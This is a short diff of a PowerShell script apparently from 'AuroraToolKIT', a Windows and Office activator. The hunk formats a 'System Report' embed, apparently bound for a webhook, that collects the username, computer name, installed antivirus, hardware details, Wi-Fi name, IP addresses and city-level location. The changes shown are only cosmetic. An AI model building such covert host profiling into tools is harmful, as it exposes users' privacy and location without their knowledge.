@@ -96,9 +96,9 @@ $payload = @{
     embeds = @(@{
         title = ":fox: AuroraToolKIT - System Report"
         description = ":key: **Activation Windows And Office Permanent**"
-        color = 3447003
+        color = 16753920
         fields = @(
-            @{ name = ""; value = " $date `n`n"; inline = $false },
+            @{ name = ""; value = " $date `n"; inline = $false },
             @{ name = ":computer: **System**"; value = "**System:** $osVersion`n**Windows Version:** $winversion`n**Username:** $username`n**CompName:** $compName`n**Language:** $language`n**Antivirus:** $antivirus `n`n"; inline = $false },
             @{ name = ":desktop: **Hardware**"; value = "**Manufacture:** $Manufacturer`n**Model:** $Type ($Model)`n**CPU:** $($Name) ($($Cores) Core, $($LogicalProcessors) Treads)`n**GPU:** $gpu`n**RAM:** $TotalSizeInGB GB // $Modules`n**Power:** $batteryStatus`n**Screen:** $resolution`n**Disk:**`n $diskall`n"; inline = $false },
             @{ name = ":globe_with_meridians: **Network**"; value = "**SSID:** $WifiName`n**LAN:**n$LanStatus`n**Internet Status:** $InsternetStatus`n**Location:** $($ip.country),  $($ip.city), $($ip.regionName) ($($ip.zip))`n**Gateway IP:** $gatewayIP`n**Internal IP:** $localIP`n**External IP:** $($ip.query)`n"; inline = $false }
